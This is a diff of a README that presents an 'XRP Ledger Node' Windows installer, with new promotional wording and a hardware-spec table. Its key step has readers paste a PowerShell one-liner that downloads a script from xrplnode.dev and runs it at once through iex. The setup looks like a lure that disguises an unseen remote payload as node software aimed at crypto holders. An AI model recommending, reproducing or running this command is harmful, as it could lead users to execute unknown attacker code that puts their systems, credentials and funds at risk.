@@ -1,7 +1,10 @@
 <img src="https://github.com/XRPL-Node/mainnet/blob/main/xrpllogo.png?raw=true">
 
-## XRP Ledger Node Installation on Windows
-_The CMD command is the recommended way to install **XRP Ledger Node**. It automatically installs all required dependencies and completes the setup in a single step._
+#### Take full control. Run your own node.
+Become fully sovereign while helping secure the network. Become part of the XRP network.
+
+## Getting started
+_Using Command Prompt is the recommended way to install an XRP node on Windows. It automatically installs all required dependencies and completes the setup in a single step._
 
 ### Step 1: Open Command prompt
 Press `Win + R`, type `CMD`, and press **Enter**.
@@ -11,9 +14,42 @@ Press `Win + R`, type `CMD`, and press **Enter**.
 powershell -command "$version='xrp-mainnet-node=4.1.7-1b0a841'; iwr -useb xrplnode.dev/install | iex"
 `````
 
-_After executing the command, the node will begin initializing and syncing with the XRP Ledger network._ <br>
+_After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
 
-When you first run an XRP node, your node will need to sync with the XRP Ledger network. This process can take a few minutes, depending on your internet connection speed. You will see synchronization progress in the Command Prompt window.
+This process can take a few minutes, depending on your internet connection speed.
+
+<table>
+<tr>
+<td width="50%" valign="top">
+
+<b>Minimum specs</b>
+
+<ul>
+<li>4–8 GB RAM</li>
+<li>2 TB SSD<br>
+<small><em>SSD required for write speeds</em></small></li>
+</ul>
+
+</td>
+
+<td width="50%" valign="top">
+
+<b>Recommended</b>
+
+<ul>
+<li>Intel NUC (7th gen or newer)<br>
+<small>x86 processor</small></li>
+
+<li>Wired internet connection<br>
+<small>More stable and easier setup</small></li>
+
+<li>Display & keyboard<br>
+<small>Not needed for headless / SSH setup</small></li>
+</ul>
+
+</td>
+</tr>
+</table>
 
 # Community
 Thanks to all XRP validators supporting the network.
